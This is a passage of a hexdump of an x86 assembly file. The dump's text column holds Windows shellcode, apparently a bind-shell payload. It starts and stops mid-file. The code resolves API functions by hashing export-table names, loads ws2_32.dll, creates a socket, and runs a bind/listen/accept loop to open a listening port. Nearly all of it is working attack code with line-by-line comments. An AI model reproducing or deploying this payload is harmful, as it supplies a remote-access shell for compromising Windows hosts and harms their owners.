00001290  26 28 57 53 41 44 41 54  41 29 0d 0a 20 20 20 20  |&(WSADATA)..    |
000012a0  50 55 53 48 20 20 20 20  45 43 58 20 20 20 20 20  |PUSH    ECX     |
000012b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000012c0  20 20 20 20 3b 20 5f 5f  69 6e 20 57 4f 52 44 20  |    ; __in WORD |
000012d0  77 56 65 72 73 69 6f 6e  52 65 71 75 65 73 74 65  |wVersionRequeste|
000012e0  64 20 3d 20 32 20 28 32  2e 30 29 0d 0a 3b 20 53  |d = 2 (2.0)..; S|
000012f0  65 74 20 75 70 20 45 44  49 20 73 6f 20 74 68 61  |et up EDI so tha|
00001300  74 20 61 20 70 72 6f 63  20 61 64 64 72 65 73 73  |t a proc address|
00001310  65 73 20 74 61 62 6c 65  20 63 61 6e 20 62 65 20  |es table can be |
00001320  63 72 65 61 74 65 64 20  69 6e 20 74 68 65 20 4e  |created in the N|
00001330  55 4c 4c 73 2c 0d 0a 3b  20 66 6f 6c 6c 6f 77 65  |ULLs,..; followe|
00001340  64 20 62 79 20 73 75 66  66 69 63 69 65 6e 74 20  |d by sufficient |
00001350  73 70 61 63 65 20 74 6f  20 73 74 6f 72 65 20 61  |space to store a|
00001360  20 73 74 72 75 63 74 20  73 6f 63 6b 61 64 64 72  | struct sockaddr|
00001370  5f 69 6e 3a 0d 0a 20 20  20 20 53 55 42 20 20 20  |_in:..    SUB   |
00001380  20 20 45 44 49 2c 20 42  59 54 45 20 73 69 7a 65  |  EDI, BYTE size|
00001390  6f 66 5f 70 72 6f 63 5f  61 64 64 72 65 73 73 5f  |of_proc_address_|
000013a0  74 61 62 6c 65 20 2b 20  73 69 7a 65 6f 66 5f 73  |table + sizeof_s|
000013b0  6f 63 6b 61 64 64 72 5f  69 6e 0d 0a 0d 0a 67 65  |ockaddr_in....ge|
000013c0  74 5f 70 72 6f 63 5f 61  64 64 72 65 73 73 5f 6c  |t_proc_address_l|
000013d0  6f 6f 70 3a 0d 0a 20 20  20 20 4d 4f 56 53 42 20  |oop:..    MOVSB |
000013e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000013f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00001400  5b 45 44 49 5d 20 3d 20  68 61 73 68 0d 0a 20 20  |[EDI] = hash..  |
00001410  20 20 44 45 43 20 20 20  20 20 45 44 49 20 20 20  |  DEC     EDI   |
00001420  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001430  20 20 20 20 20 20 3b 20  52 65 73 74 6f 72 65 20  |      ; Restore |
00001440  45 44 49 0d 0a 3b 20 46  69 6e 64 20 74 68 65 20  |EDI..; Find the |
00001450  50 45 20 68 65 61 64 65  72 20 61 6e 64 20 65 78  |PE header and ex|
00001460  70 6f 72 74 20 61 6e 64  20 6e 61 6d 65 73 20 74  |port and names t|
00001470  61 62 6c 65 73 20 6f 66  20 74 68 65 20 6d 6f 64  |ables of the mod|
00001480  75 6c 65 3a 0d 0a 20 20  20 20 4d 4f 56 20 20 20  |ule:..    MOV   |
00001490  20 20 45 42 58 2c 20 5b  45 42 50 20 2b 20 30 78  |  EBX, [EBP + 0x|
000014a0  33 43 5d 20 20 20 20 20  20 20 20 20 20 20 3b 20  |3C]           ; |
000014b0  45 42 58 20 3d 20 26 28  50 45 20 68 65 61 64 65  |EBX = &(PE heade|
000014c0  72 29 0d 0a 20 20 20 20  4d 4f 56 20 20 20 20 20  |r)..    MOV     |
000014d0  45 42 58 2c 20 5b 45 42  50 20 2b 20 45 42 58 20  |EBX, [EBP + EBX |
000014e0  2b 20 30 78 37 38 5d 20  20 20 20 20 3b 20 45 42  |+ 0x78]     ; EB|
000014f0  58 20 3d 20 6f 66 66 73  65 74 28 65 78 70 6f 72  |X = offset(expor|
00001500  74 20 74 61 62 6c 65 29  0d 0a 20 20 20 20 41 44  |t table)..    AD|
00001510  44 20 20 20 20 20 45 42  58 2c 20 45 42 50 20 20  |D     EBX, EBP  |
00001520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001530  20 20 3b 20 45 42 58 20  3d 20 26 28 65 78 70 6f  |  ; EBX = &(expo|
00001540  72 74 20 74 61 62 6c 65  29 0d 0a 20 20 20 20 4d  |rt table)..    M|
00001550  4f 56 20 20 20 20 20 45  43 58 2c 20 5b 45 42 58  |OV     ECX, [EBX|
00001560  20 2b 20 30 78 32 30 5d  20 20 20 20 20 20 20 20  | + 0x20]        |
00001570  20 20 20 3b 20 45 43 58  20 3d 20 6f 66 66 73 65  |   ; ECX = offse|
00001580  74 28 6e 61 6d 65 73 20  74 61 62 6c 65 29 0d 0a  |t(names table)..|
00001590  20 20 20 20 41 44 44 20  20 20 20 20 45 43 58 2c  |    ADD     ECX,|
000015a0  20 45 42 50 20 20 20 20  20 20 20 20 20 20 20 20  | EBP            |
000015b0  20 20 20 20 20 20 20 20  3b 20 45 43 58 20 3d 20  |        ; ECX = |
000015c0  26 28 6e 61 6d 65 73 20  74 61 62 6c 65 29 0d 0a  |&(names table)..|
000015d0  20 20 20 20 50 55 53 48  20 20 20 20 45 53 49 20  |    PUSH    ESI |
000015e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000015f0  20 20 20 20 20 20 20 20  3b 20 53 61 76 65 20 45  |        ; Save E|
00001600  53 49 0d 0a 3b 20 48 61  73 68 20 65 61 63 68 20  |SI..; Hash each |
00001610  66 75 6e 63 74 69 6f 6e  20 6e 61 6d 65 20 61 6e  |function name an|
00001620  64 20 63 68 65 63 6b 20  69 74 20 61 67 61 69 6e  |d check it again|
00001630  73 74 20 74 68 65 20 72  65 71 75 65 73 74 65 64  |st the requested|
00001640  20 68 61 73 68 3a 0d 0a  20 20 20 20 58 4f 52 20  | hash:..    XOR |
00001650  20 20 20 20 45 44 58 2c  20 45 44 58 20 20 20 20  |    EDX, EDX    |
00001660  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001670  3b 20 45 44 58 20 3d 20  66 75 6e 63 74 69 6f 6e  |; EDX = function|
00001680  20 6e 75 6d 62 65 72 20  28 30 29 0d 0a 6e 65 78  | number (0)..nex|
00001690  74 5f 66 75 6e 63 74 69  6f 6e 5f 6c 6f 6f 70 3a  |t_function_loop:|
000016a0  0d 0a 3b 20 47 65 74 20  74 68 65 20 6e 65 78 74  |..; Get the next|
000016b0  20 66 75 6e 63 74 69 6f  6e 20 6e 61 6d 65 3a 0d  | function name:.|
000016c0  0a 20 20 20 20 49 4e 43  20 20 20 20 20 45 44 58  |.    INC     EDX|
000016d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000016e0  20 20 20 20 20 20 20 20  20 3b 20 49 6e 63 72 65  |         ; Incre|
000016f0  6d 65 6e 74 20 66 75 6e  63 74 69 6f 6e 20 6e 75  |ment function nu|
00001700  6d 62 65 72 0d 0a 20 20  20 20 4d 4f 56 20 20 20  |mber..    MOV   |
00001710  20 20 45 53 49 2c 20 5b  45 43 58 20 2b 20 45 44  |  ESI, [ECX + ED|
00001720  58 20 2a 20 34 5d 20 20  20 20 20 20 20 20 3b 20  |X * 4]        ; |
00001730  45 53 49 20 3d 20 6f 66  66 73 65 74 28 66 75 6e  |ESI = offset(fun|
00001740  63 74 69 6f 6e 20 6e 61  6d 65 29 0d 0a 20 20 20  |ction name)..   |
00001750  20 41 44 44 20 20 20 20  20 45 53 49 2c 20 45 42  | ADD     ESI, EB|
00001760  50 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |P               |
00001770  20 20 20 20 20 3b 20 45  53 49 20 3d 20 26 28 66  |     ; ESI = &(f|
00001780  75 6e 63 74 69 6f 6e 20  6e 61 6d 65 29 0d 0a 20  |unction name).. |
00001790  20 20 20 58 4f 52 20 20  20 20 20 45 41 58 2c 20  |   XOR     EAX, |
000017a0  45 41 58 20 20 20 20 20  20 20 20 20 20 20 20 20  |EAX             |
000017b0  20 20 20 20 20 20 20 3b  20 45 41 58 20 3d 20 30  |       ; EAX = 0|
000017c0  0d 0a 68 61 73 68 5f 6c  6f 6f 70 3a 0d 0a 3b 20  |..hash_loop:..; |
000017d0  48 61 73 68 20 74 68 65  20 66 75 6e 63 74 69 6f  |Hash the functio|
000017e0  6e 20 6e 61 6d 65 3a 0d  0a 20 20 20 20 4c 4f 44  |n name:..    LOD|
000017f0  53 42 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |SB              |
00001800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001810  20 3b 20 4c 6f 61 64 20  61 20 63 68 61 72 61 63  | ; Load a charac|
00001820  74 65 72 20 6f 66 20 74  68 65 20 66 75 6e 63 74  |ter of the funct|
00001830  69 6f 6e 20 6e 61 6d 65  0d 0a 20 20 20 20 58 4f  |ion name..    XO|
00001840  52 20 20 20 20 20 41 4c  2c 20 30 78 37 31 20 20  |R     AL, 0x71  |
00001850  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001860  20 20 3b 20 43 61 6c 63  75 6c 61 74 65 20 61 20  |  ; Calculate a |
00001870  68 61 73 68 0d 0a 20 20  20 20 53 55 42 20 20 20  |hash..    SUB   |
00001880  20 20 41 48 2c 20 41 4c  20 20 20 20 20 20 20 20  |  AH, AL        |
00001890  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 0d  |              ;.|
000018a0  0a 20 20 20 20 43 4d 50  20 20 20 20 20 41 4c 2c  |.    CMP     AL,|
000018b0  20 30 78 37 31 20 20 20  20 20 20 20 20 20 20 20  | 0x71           |
000018c0  20 20 20 20 20 20 20 20  20 3b 20 49 73 20 74 68  |         ; Is th|
000018d0  69 73 20 74 68 65 20 74  65 72 6d 69 6e 61 74 69  |is the terminati|
000018e0  6e 67 20 30 20 62 79 74  65 3f 0d 0a 20 20 20 20  |ng 0 byte?..    |
000018f0  4a 4e 45 20 20 20 20 20  68 61 73 68 5f 6c 6f 6f  |JNE     hash_loo|
00001900  70 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |p               |
00001910  20 20 20 20 3b 20 4e 6f  3a 20 63 6f 6e 74 69 6e  |    ; No: contin|
00001920  75 65 20 68 61 73 68 69  6e 67 0d 0a 20 20 20 20  |ue hashing..    |
00001930  43 4d 50 20 20 20 20 20  41 48 2c 20 5b 45 44 49  |CMP     AH, [EDI|
00001940  5d 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |]               |
00001950  20 20 20 20 3b 20 59 65  73 3a 20 44 6f 65 73 20  |    ; Yes: Does |
00001960  74 68 65 20 68 61 73 68  20 6d 61 74 63 68 20 3f  |the hash match ?|
00001970  0d 0a 3b 20 43 68 65 63  6b 20 69 66 20 74 68 65  |..; Check if the|
00001980  20 68 61 73 68 20 6d 61  74 63 68 65 73 20 61 6e  | hash matches an|
00001990  64 20 6c 6f 6f 70 20 69  66 20 6e 6f 74 3a 0d 0a  |d loop if not:..|
000019a0  20 20 20 20 4a 4e 5a 20  20 20 20 20 6e 65 78 74  |    JNZ     next|
000019b0  5f 66 75 6e 63 74 69 6f  6e 5f 6c 6f 6f 70 0d 0a  |_function_loop..|
000019c0  20 20 20 20 50 4f 50 20  20 20 20 20 45 53 49 20  |    POP     ESI |
000019d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000019e0  20 20 20 20 20 20 20 20  3b 20 52 65 73 74 6f 72  |        ; Restor|
000019f0  65 20 45 53 49 0d 0a 3b  20 46 69 6e 64 20 74 68  |e ESI..; Find th|
00001a00  65 20 61 64 64 72 65 73  73 20 6f 66 20 74 68 65  |e address of the|
00001a10  20 72 65 71 75 65 73 74  65 64 20 66 75 6e 63 74  | requested funct|
00001a20  69 6f 6e 3a 0d 0a 20 20  20 20 4d 4f 56 20 20 20  |ion:..    MOV   |
00001a30  20 20 45 43 58 2c 20 5b  45 42 58 20 2b 20 30 78  |  ECX, [EBX + 0x|
00001a40  32 34 5d 20 20 20 20 20  20 20 20 20 20 20 3b 20  |24]           ; |
00001a50  45 43 58 20 3d 20 6f 66  66 73 65 74 20 6f 72 64  |ECX = offset ord|
00001a60  69 6e 61 6c 73 20 74 61  62 6c 65 0d 0a 20 20 20  |inals table..   |
00001a70  20 41 44 44 20 20 20 20  20 45 43 58 2c 20 45 42  | ADD     ECX, EB|
00001a80  50 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |P               |
00001a90  20 20 20 20 20 3b 20 45  43 58 20 3d 20 26 6f 72  |     ; ECX = &or|
00001aa0  69 64 69 6e 61 6c 73 20  74 61 62 6c 65 0d 0a 20  |idinals table.. |
00001ab0  20 20 20 4d 4f 56 5a 58  20 20 20 45 44 58 2c 20  |   MOVZX   EDX, |
00001ac0  57 4f 52 44 20 5b 45 43  58 20 2b 20 32 20 2a 20  |WORD [ECX + 2 * |
00001ad0  45 44 58 5d 20 20 20 3b  20 45 44 58 20 3d 20 6f  |EDX]   ; EDX = o|
00001ae0  72 64 69 6e 61 6c 20 6e  75 6d 62 65 72 20 6f 66  |rdinal number of|
00001af0  20 66 75 6e 63 74 69 6f  6e 0d 0a 20 20 20 20 4d  | function..    M|
00001b00  4f 56 20 20 20 20 20 45  43 58 2c 20 5b 45 42 58  |OV     ECX, [EBX|
00001b10  20 2b 20 30 78 31 43 5d  20 20 20 20 20 20 20 20  | + 0x1C]        |
00001b20  20 20 20 3b 20 45 43 58  20 3d 20 6f 66 66 73 65  |   ; ECX = offse|
00001b30  74 20 61 64 64 72 65 73  73 20 74 61 62 6c 65 0d  |t address table.|
00001b40  0a 20 20 20 20 41 44 44  20 20 20 20 20 45 43 58  |.    ADD     ECX|
00001b50  2c 20 45 42 50 20 20 20  20 20 20 20 20 20 20 20  |, EBP           |
00001b60  20 20 20 20 20 20 20 20  20 3b 20 45 43 58 20 3d  |         ; ECX =|
00001b70  20 26 61 64 64 72 65 73  73 20 74 61 62 6c 65 0d  | &address table.|
00001b80  0a 20 20 20 20 4d 4f 56  20 20 20 20 20 45 41 58  |.    MOV     EAX|
00001b90  2c 20 45 42 50 20 20 20  20 20 20 20 20 20 20 20  |, EBP           |
00001ba0  20 20 20 20 20 20 20 20  20 3b 20 45 41 58 20 3d  |         ; EAX =|
00001bb0  20 26 28 6d 6f 64 75 6c  65 29 0d 0a 20 20 20 20  | &(module)..    |
00001bc0  41 44 44 20 20 20 20 20  45 41 58 2c 20 5b 45 43  |ADD     EAX, [EC|
00001bd0  58 20 2b 20 34 20 2a 20  45 44 58 5d 20 20 20 20  |X + 4 * EDX]    |
00001be0  20 20 20 20 3b 20 45 41  58 20 3d 20 26 28 66 75  |    ; EAX = &(fu|
00001bf0  6e 63 74 69 6f 6e 29 0d  0a 3b 20 53 61 76 65 20  |nction)..; Save |
00001c00  74 68 65 20 61 64 64 72  65 73 73 20 6f 66 20 74  |the address of t|
00001c10  68 65 20 72 65 71 75 65  73 74 65 64 20 66 75 6e  |he requested fun|
00001c20  63 74 69 6f 6e 3a 0d 0a  20 20 20 20 53 54 4f 53  |ction:..    STOS|
00001c30  44 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |D               |
00001c40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001c50  3b 20 53 61 76 65 20 70  72 6f 63 20 61 64 64 72  |; Save proc addr|
00001c60  65 73 73 0d 0a 3b 20 57  68 65 6e 20 6e 65 65 64  |ess..; When need|
00001c70  65 64 2c 20 63 61 6c 6c  20 4c 6f 61 64 4c 69 62  |ed, call LoadLib|
00001c80  72 61 72 79 41 20 74 6f  20 73 74 61 72 74 20 6c  |raryA to start l|
00001c90  6f 6f 6b 69 6e 67 20 66  6f 72 20 77 73 32 5f 33  |ooking for ws2_3|
00001ca0  32 2e 64 6c 6c 20 66 75  6e 63 74 69 6f 6e 73 3a  |2.dll functions:|
00001cb0  0d 0a 20 20 20 20 43 4d  50 20 20 20 20 20 42 59  |..    CMP     BY|
00001cc0  54 45 20 5b 45 53 49 5d  2c 20 68 61 73 68 5f 77  |TE [ESI], hash_w|
00001cd0  73 32 5f 33 32 5f 57 53  41 53 74 61 72 74 75 70  |s2_32_WSAStartup|
00001ce0  20 3b 20 57 65 20 6a 75  73 74 20 66 6f 75 6e 64  | ; We just found|
00001cf0  20 4c 6f 61 64 4c 69 62  72 61 72 79 41 0d 0a 20  | LoadLibraryA.. |
00001d00  20 20 20 4a 4e 45 20 20  20 20 20 73 6b 69 70 5f  |   JNE     skip_|
00001d10  6c 6f 61 64 5f 6c 69 62  72 61 72 79 20 20 20 20  |load_library    |
00001d20  20 20 20 20 20 20 20 3b  0d 0a 20 20 20 20 4c 45  |       ;..    LE|
00001d30  41 20 20 20 20 20 45 42  58 2c 20 5b 45 53 49 20  |A     EBX, [ESI |
00001d40  2d 20 6f 66 66 73 65 74  5f 57 53 41 53 74 61 72  |- offset_WSAStar|
00001d50  74 75 70 5f 69 6e 5f 68  61 73 68 5f 74 61 62 6c  |tup_in_hash_tabl|
00001d60  65 20 2b 20 73 69 7a 65  6f 66 5f 68 61 73 68 5f  |e + sizeof_hash_|
00001d70  74 61 62 6c 65 5d 0d 0a  20 20 20 20 50 55 53 48  |table]..    PUSH|
00001d80  20 20 20 20 45 42 58 20  20 20 20 20 20 20 20 20  |    EBX         |
00001d90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001da0  3b 20 5f 5f 69 6e 20 4c  50 43 54 53 54 52 20 6c  |; __in LPCTSTR l|
00001db0  70 46 69 6c 65 4e 61 6d  65 20 3d 20 26 28 22 77  |pFileName = &("w|
00001dc0  73 32 5f 33 32 22 29 0d  0a 20 20 20 20 43 41 4c  |s2_32")..    CAL|
00001dd0  4c 20 20 20 20 45 41 58  20 20 20 20 20 20 20 20  |L    EAX        |
00001de0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001df0  20 3b 20 4c 6f 61 64 4c  69 62 72 61 72 79 41 28  | ; LoadLibraryA(|
00001e00  26 22 77 73 32 5f 33 32  22 29 20 0d 0a 20 20 20  |&"ws2_32") ..   |
00001e10  20 50 55 53 48 20 20 20  20 45 44 49 20 20 20 20  | PUSH    EDI    |
00001e20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e30  20 20 20 20 20 3b 20 53  61 76 65 20 70 72 6f 63  |     ; Save proc|
00001e40  20 61 64 64 72 65 73 73  20 74 61 62 6c 65 5b 57  | address table[W|
00001e50  53 41 53 74 61 72 74 75  70 5d 0d 0a 20 20 20 20  |SAStartup]..    |
00001e60  58 43 48 47 20 20 20 20  45 41 58 2c 20 45 42 50  |XCHG    EAX, EBP|
00001e70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e80  20 20 20 20 3b 20 45 42  50 20 3d 20 26 28 77 73  |    ; EBP = &(ws|
00001e90  32 5f 33 32 2e 64 6c 6c  29 0d 0a 73 6b 69 70 5f  |2_32.dll)..skip_|
00001ea0  6c 6f 61 64 5f 6c 69 62  72 61 72 79 3a 0d 0a 3b  |load_library:..;|
00001eb0  20 43 6f 6e 74 69 6e 75  65 20 75 6e 74 69 6c 20  | Continue until |
00001ec0  61 6c 6c 20 68 61 73 68  65 73 20 68 61 76 65 20  |all hashes have |
00001ed0  62 65 65 6e 20 66 6f 75  6e 64 3a 0d 0a 20 20 20  |been found:..   |
00001ee0  20 43 4d 50 20 20 20 20  20 42 59 54 45 20 5b 45  | CMP     BYTE [E|
00001ef0  53 49 5d 2c 20 65 6e 64  5f 6f 66 5f 68 61 73 68  |SI], end_of_hash|
00001f00  5f 74 61 62 6c 65 5f 6d  61 72 6b 65 72 0d 0a 20  |_table_marker.. |
00001f10  20 20 20 4a 4e 45 20 20  20 20 20 67 65 74 5f 70  |   JNE     get_p|
00001f20  72 6f 63 5f 61 64 64 72  65 73 73 5f 6c 6f 6f 70  |roc_address_loop|
00001f30  20 20 20 20 20 20 20 3b  0d 0a 20 20 20 20 50 4f  |       ;..    PO|
00001f40  50 20 20 20 20 20 45 53  49 0d 0a 3b 20 43 61 6c  |P     ESI..; Cal|
00001f50  6c 20 57 53 41 53 74 61  72 74 75 70 20 28 41 72  |l WSAStartup (Ar|
00001f60  67 75 6d 65 6e 74 73 20  61 72 65 20 61 6c 72 65  |guments are alre|
00001f70  61 64 79 20 6f 6e 20 74  68 65 20 73 74 61 63 6b  |ady on the stack|
00001f80  29 0d 0a 20 20 20 20 4c  4f 44 53 44 0d 0a 20 20  |)..    LODSD..  |
00001f90  20 20 43 41 4c 4c 20 20  20 20 45 41 58 20 20 20  |  CALL    EAX   |
00001fa0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001fb0  20 20 20 20 20 20 3b 20  57 53 41 53 54 41 52 54  |      ; WSASTART|
00001fc0  55 50 0d 0a 3b 20 43 61  6c 6c 20 57 53 41 53 6f  |UP..; Call WSASo|
00001fd0  63 6b 65 74 20 28 41 72  67 75 6d 65 6e 74 73 20  |cket (Arguments |
00001fe0  61 72 65 20 61 6c 72 65  61 64 79 20 6f 6e 20 74  |are already on t|
00001ff0  68 65 20 73 74 61 63 6b  29 0d 0a 20 20 20 20 4c  |he stack)..    L|
00002000  4f 44 53 44 0d 0a 20 20  20 20 43 41 4c 4c 20 20  |ODSD..    CALL  |
00002010  20 20 45 41 58 0d 0a 20  20 20 20 58 43 48 47 20  |  EAX..    XCHG |
00002020  20 20 20 45 41 58 2c 20  45 42 50 20 20 20 20 20  |   EAX, EBP     |
00002030  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00002040  20 45 42 50 20 3d 20 53  65 72 76 65 72 20 73 6f  | EBP = Server so|
00002050  63 6b 65 74 0d 0a 0d 0a  3b 20 43 72 65 61 74 65  |cket....; Create|
00002060  20 61 20 73 74 72 75 63  74 20 73 6f 63 6b 61 64  | a struct sockad|
00002070  64 72 5f 69 6e 20 6f 6e  20 74 68 65 20 73 74 61  |dr_in on the sta|
00002080  63 6b 20 66 6f 72 20 75  73 65 20 62 79 20 62 69  |ck for use by bi|
00002090  6e 64 28 29 0d 0a 73 69  7a 65 6f 66 5f 73 6f 63  |nd()..sizeof_soc|
000020a0  6b 61 64 64 72 5f 69 6e  20 65 71 75 20 32 20 2b  |kaddr_in equ 2 +|
000020b0  20 32 20 2b 20 34 20 2b  20 38 0d 0a 20 20 20 20  | 2 + 4 + 8..    |
000020c0  53 55 42 20 20 20 20 20  44 57 4f 52 44 20 5b 45  |SUB     DWORD [E|
000020d0  44 49 5d 2c 20 2d 57 32  44 57 28 20 41 46 5f 49  |DI], -W2DW( AF_I|
000020e0  4e 45 54 2c 20 42 32 57  28 70 6f 72 74 20 3e 3e  |NET, B2W(port >>|
000020f0  20 38 2c 20 70 6f 72 74  20 26 20 30 78 46 46 29  | 8, port & 0xFF)|
00002100  29 3b 20 73 69 6e 5f 66  61 6d 69 6c 79 20 3d 20  |); sin_family = |
00002110  41 46 5f 49 4e 45 54 2c  20 73 69 6e 5f 70 6f 72  |AF_INET, sin_por|
00002120  74 20 3d 20 28 70 6f 72  74 2c 20 6c 69 74 74 6c  |t = (port, littl|
00002130  65 20 65 6e 64 69 61 6e  21 29 0d 0a 3b 20 53 65  |e endian!)..; Se|
00002140  74 20 75 70 20 74 68 65  20 32 6e 64 20 61 6e 64  |t up the 2nd and|
00002150  20 33 72 64 20 61 72 67  75 6d 65 6e 74 20 66 6f  | 3rd argument fo|
00002160  72 20 62 69 6e 64 3a 0d  0a 3b 20 20 20 62 69 6e  |r bind:..;   bin|
00002170  64 28 5f 5f 69 6e 20 53  4f 43 4b 45 54 20 73 3d  |d(__in SOCKET s=|
00002180  28 61 64 64 65 64 20 6c  61 74 65 72 29 2c 20 5f  |(added later), _|
00002190  5f 69 6e 20 63 6f 6e 73  74 20 73 74 72 75 63 74  |_in const struct|
000021a0  20 73 6f 63 6b 61 64 64  72 20 2a 6e 61 6d 65 2c  | sockaddr *name,|
000021b0  20 5f 5f 69 6e 20 69 6e  74 20 6e 61 6d 65 6c 65  | __in int namele|
000021c0  6e 29 0d 0a 20 20 20 20  50 55 53 48 20 20 20 20  |n)..    PUSH    |
000021d0  42 59 54 45 20 30 78 31  30 20 20 20 20 20 20 20  |BYTE 0x10       |
000021e0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 5f 5f  |            ; __|
000021f0  69 6e 20 69 6e 74 20 6e  61 6d 65 6c 65 6e 20 3d  |in int namelen =|
00002200  20 30 78 31 30 0d 0a 20  20 20 20 50 55 53 48 20  | 0x10..    PUSH |
00002210  20 20 20 45 44 49 20 20  20 20 20 20 20 20 20 20  |   EDI          |
00002220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00002230  20 5f 5f 69 6e 20 63 6f  6e 73 74 20 73 74 72 75  | __in const stru|
00002240  63 74 20 73 6f 63 6b 61  64 64 72 20 2a 6e 61 6d  |ct sockaddr *nam|
00002250  65 20 3d 20 26 28 73 6f  63 6b 61 64 64 72 5f 69  |e = &(sockaddr_i|
00002260  6e 29 0d 0a 3b 20 62 69  6e 64 28 29 2c 20 6c 69  |n)..; bind(), li|
00002270  73 74 65 6e 28 29 20 61  6e 64 20 61 63 63 65 70  |sten() and accep|
00002280  74 28 29 20 61 6c 6c 20  74 61 6b 65 20 74 68 65  |t() all take the|
00002290  20 73 65 72 76 65 72 20  73 6f 63 6b 65 74 20 61  | server socket a|
000022a0  73 20 74 68 65 69 72 20  66 69 72 73 74 0d 0a 3b  |s their first..;|
000022b0  20 61 72 67 75 6d 65 6e  74 2e 20 6c 69 73 74 65  | argument. liste|
000022c0  6e 28 29 20 61 6e 64 20  61 63 63 65 70 74 28 29  |n() and accept()|
000022d0  20 6f 6e 6c 79 20 6e 65  65 64 20 4e 55 4c 4c 73  | only need NULLs|
000022e0  20 66 6f 72 20 74 68 65  20 72 65 6d 61 69 6e 69  | for the remaini|
000022f0  6e 67 20 61 72 67 75 6d  65 6e 74 73 0d 0a 3b 20  |ng arguments..; |
00002300  61 6e 64 20 74 68 65 20  61 72 67 75 6d 65 6e 74  |and the argument|
00002310  73 20 66 6f 72 20 62 69  6e 64 28 29 20 61 72 65  |s for bind() are|
00002320  20 61 6c 72 65 61 64 79  20 6f 6e 20 74 68 65 20  | already on the |
00002330  73 74 61 63 6b 2e 20 42  65 63 61 75 73 65 20 62  |stack. Because b|
00002340  69 6e 64 28 29 20 61 6e  64 20 0d 0a 3b 20 61 63  |ind() and ..; ac|
00002350  63 65 70 74 28 29 20 72  65 74 75 72 6e 20 30 20  |cept() return 0 |
00002360  61 6e 64 20 6c 69 73 74  65 6e 28 29 20 72 65 74  |and listen() ret|
00002370  75 72 6e 73 20 61 20 73  6f 63 6b 65 74 2c 20 77  |urns a socket, w|
00002380  68 69 63 68 20 69 73 20  6e 6f 74 20 30 2c 20 61  |hich is not 0, a|
00002390  20 6c 6f 6f 70 20 63 61  6e 20 62 65 0d 0a 3b 20  | loop can be..; |
000023a0  75 73 65 64 20 74 6f 20  63 61 6c 6c 20 74 68 65  |used to call the|
000023b0  6d 3a 0d 0a 3b 20 20 20  6c 69 73 74 65 6e 28 5f  |m:..;   listen(_|
000023c0  5f 69 6e 20 53 4f 43 4b  45 54 20 73 3d 28 61 64  |_in SOCKET s=(ad|
000023d0  64 65 64 20 6c 61 74 65  72 29 2c 20 5f 5f 69 6e  |ded later), __in|
000023e0  20 69 6e 74 20 62 61 63  6b 6c 6f 67 3d 30 29 0d  | int backlog=0).|
000023f0  0a 3b 20 20 20 61 63 63  65 70 74 28 5f 5f 69 6e  |.;   accept(__in|
00002400  20 53 4f 43 4b 45 54 20  73 3d 28 61 64 64 65 64  | SOCKET s=(added|
00002410  20 6c 61 74 65 72 29 2c  20 5f 5f 69 6e 20 73 74  | later), __in st|
00002420  72 75 63 74 20 73 6f 63  6b 61 64 64 72 20 2a 61  |ruct sockaddr *a|
00002430  64 64 72 3d 30 2c 20 5f  5f 69 6e 6f 75 74 20 69  |ddr=0, __inout i|
00002440  6e 74 20 2a 61 64 64 72  6c 65 6e 3d 30 29 0d 0a  |nt *addrlen=0)..|
00002450  63 61 6c 6c 5f 6c 6f 6f  70 3a 0d 0a 20 20 20 20  |call_loop:..    |
00002460  4c 4f 44 53 44 0d 0a 61  63 63 65 70 74 5f 6c 6f  |LODSD..accept_lo|
00002470  6f 70 3a 0d 0a 20 20 20  20 50 55 53 48 20 20 20  |op:..    PUSH   |
00002480  20 45 42 50 20 20 20 20  20 20 20 20 20 20 20 20  | EBP            |
00002490  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 5f  |             ; _|
000024a0  5f 69 6e 20 53 4f 43 4b  45 54 20 73 20 3d 20 53  |_in SOCKET s = S|
000024b0  65 72 76 65 72 20 73 6f  63 6b 65 74 20 64 65 73  |erver socket des|
000024c0  63 72 69 70 74 6f 72 0d  0a 20 20 20 20 43 41 4c  |criptor..    CAL|
000024d0  4c 20 20 20 20 45 41 58  0d 0a 3b 20 43 68 65 63  |L    EAX..; Chec|
000024e0  6b 20 69 66 20 61 63 63  65 70 74 28 29 20 68 61  |k if accept() ha|
000024f0  73 20 72 65 74 75 72 6e  65 64 20 61 20 73 6f 63  |s returned a soc|
00002500  6b 65 74 3a 0d 0a 20 20  20 20 54 45 53 54 20 20  |ket:..    TEST  |
00002510  20 20 45 41 58 2c 20 45  41 58 0d 0a 20 20 20 20  |  EAX, EAX..    |
00002520  4a 5a 20 20 20 20 20 20  63 61 6c 6c 5f 6c 6f 6f  |JZ      call_loo|
00002530  70 0d 0a 0d 0a 3b 20 43  72 65 61 74 65 20 73 74  |p....; Create st|
